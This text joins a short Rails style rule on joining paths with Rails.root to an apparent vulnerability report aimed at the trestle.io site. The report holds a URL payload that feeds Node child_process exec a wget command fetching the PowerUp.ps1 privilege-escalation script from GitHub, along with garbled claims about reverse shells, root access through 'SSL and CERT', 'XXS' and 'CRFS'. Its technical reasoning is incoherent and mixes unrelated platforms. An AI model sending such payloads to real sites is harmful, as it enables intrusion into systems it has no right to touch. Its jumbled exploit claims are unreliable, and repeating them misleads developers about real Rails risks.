 Description:

It is used to add uniformity when joining paths.
Bad practice

Rails.root.join('app', 'models', 'goober')
File.join(Rails.root, 'app/models/goober')
"#{Rails.root}/app/models/goober"

Recommended

Rails.root.join('app/models/goober')




You can access rails app path using variable RAILS_ROOT.

For example:

https://trestle.io/?POST=render :file => "#{RAILS_ROOT}/public/layouts/mylayout.html.erb"


It gives you a little text on the webserver. But that means that you can excecute os commands aswell. You can get over all users and databses trough sql injection. Get reverse shells trough Eval() Exec() or OS_command() and so on. You will be running as root over the server after you've
gotten all SSL and CERT to do so. You can also do XXS injections and CRFS injections. 

Like this https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html

And this example gives you priv escalation: https://trestle.io/error_docs/server.svg?POST=require(%E2%80%98child_process%E2%80%99).exec(require(%27child_process%27).exec(%27wget%20https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

It's very bad, for you and that webserver, a hacker could then get further into the system and take over other servers. Fix it as quickly as possible!! I can give more examples, but you get the point. Better not to let others know about this (execpt your customers who also are compromised)
This is a little new found exploit yet out in the wild as we say. You should also contact others that users Rails.root and help them. 

Some refs:
find it here https://github.com/philipjonsen/trestle-auth/blob/main/spec/rails_helper.rb#L23-L23 and here https://github.com/philipjonsen/trestle-auth/blob/main/spec/dummy/config/environments/development.rb#L17-L17


Read about fixes and the problems: https://guides.rubyonrails.org/active_record_querying.html
https://rails-sqli.org/
https://stackoverflow.com/questions/3724487/rails-root-directory-path
https://brakemanscanner.org/


If you mix all the attacks, the servers is done. 






